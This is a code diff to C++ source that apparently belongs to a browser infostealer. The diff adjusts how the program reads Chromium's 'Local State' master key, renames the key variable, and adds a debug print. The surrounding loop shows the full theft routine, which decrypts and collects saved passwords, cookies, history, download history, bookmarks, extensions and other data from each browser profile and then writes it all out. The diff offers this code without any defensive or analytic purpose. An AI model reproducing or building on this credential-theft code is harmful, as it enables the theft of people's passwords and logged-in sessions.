@@ -98,7 +98,7 @@ std::string decrypt_val(const std::string& key, const std::string& val) {
 
 std::string getMasterKey(std::string path) {
     try {
-        path += "\\Local State";
+        path += "/Local State";
         if (_access(path.c_str(), 0) == 0) {
             std::ifstream keyFile(path.c_str());
             std::string decryptedKey, returnKey;
@@ -720,7 +720,8 @@ void browsers::Chromium()
     {
         if (std::filesystem::exists(browsersPaths[i])) 
         {
-            std::string mk = getMasterKey(browsersPaths[i]);
+            printf("%s", browsersPaths[i].c_str());
+            std::string urmasterkey = getMasterKey(browsersPaths[i]);
 
             for (size_t j = 0; j < std::size(profiles); j++)
             {
@@ -729,7 +730,7 @@ void browsers::Chromium()
                     std::string dir = global::defaultPath + global::names[i];
                     int result = _mkdir(dir.c_str());
                     std::cout << "grab_cookies" << std::endl;
-                    std::string cookies = grab_cookies(browsersPaths[i], mk, profiles[j]);
+                    std::string cookies = grab_cookies(browsersPaths[i], urmasterkey, profiles[j]);
                     std::cout << "grab_his" << std::endl;
                     std::string history = grab_history(browsersPaths[i], profiles[j]);
                     std::cout << "grab_dhis" << std::endl;
@@ -739,9 +740,9 @@ void browsers::Chromium()
                     std::cout << "grab_ext" << std::endl;
                     std::vector<ExtensionInfo> extensions = grab_ext(browsersPaths[i], profiles[j]);
                     std::cout << "grab_misc" << std::endl;
-                    std::string misc = grab_misc(browsersPaths[i], mk, profiles[j]);
+                    std::string misc = grab_misc(browsersPaths[i], urmasterkey, profiles[j]);
                     std::cout << "grab_pwd" << std::endl;
-                    std::string pwds = grab_passwords(browsersPaths[i], mk, profiles[j]);
+                    std::string pwds = grab_passwords(browsersPaths[i], urmasterkey, profiles[j]);
                     std::cout << "grab_write" << std::endl;
                     WriteAll(global::names[i], profiles[j], cookies, history, downhistory, bookmarks, extensions, misc, pwds);
 
